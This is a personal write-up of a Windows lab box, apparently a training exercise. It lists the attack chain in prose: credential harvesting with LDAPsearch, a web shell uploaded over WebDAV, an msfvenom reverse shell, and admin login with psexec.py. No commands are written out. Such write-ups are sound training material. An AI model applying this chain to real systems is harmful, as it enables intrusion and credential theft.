# Box
Rinse and repeat on the Windows bullshit here. Just like Authby, this was an exercise in absolute frustration yesterday - trying every possible exploit combination and following numerous walkthroughs - only for the entire thing to crack in a heartbeat tonight using the exact same tools and exploit I ran 24 hours earlier.

Once again this is a reminder that these Windows boxes are unbelievable unreliable and unstable, so if you're following the exact steps of a walkthrough and things are not working, then shut the box down and move on. There is absolutely no point bashing your head against a broken box, so let it go. 

I'm still feeling overwhelmed by all these services and open ports, but this one provided some interesting lessons in attacking both WebDav & LDAP without even having initial access. I'd never heard of `cadaver` before, but if I find user credentials then my next step will be to run `cadaver` as part of my enumeration going forward - it's as simple as putting `cadaver` in front of the target IP address and logging in!

`LDAPsearch` is a tool I never knew existed either, but holy hell is it great for throwing back users and passwords! I'd heard of `psexec.py` before this box, but never knew how to use it - with the admin password (or credentials for any user) it is absolutely the way to login to a target machine without remote management. I've added the `cadaver`, `LDAPsearch` and `psexe.py` to my Windows cheatsheet, and they will get used a LOT going forward.

# Resolution summary
- Ran Nmap to identify ports `53`,`80`, `88`, `135/445`, `389`, `593`, `636` & `3389` 
- Ran `LDAPsearch` to identify user credentials
- Used `cadaver` to login to Webdav share on target
- Uploaded `cmdasp.aspx` to web root, then navigated to uploaded page for command execution
- Ran `msfvenom` to create reverse shell executable, and uploaded via Webdav
- Used `cmdasp.aspx` to run reverse shell executable for initial access
- Accessed `shell.php` via browser and received reverse shell
- Ran `LDAPsearch` with user credentials to find administrator credentials
- Ran `psexec.py` with admin credentials to login and print `proof.txt`
## Improved skills
- Using cadaver, LDAPSearch, MSFVenom, and psexec.py
- skill 2
## Used tools
- nmap
- python
- psexec.py
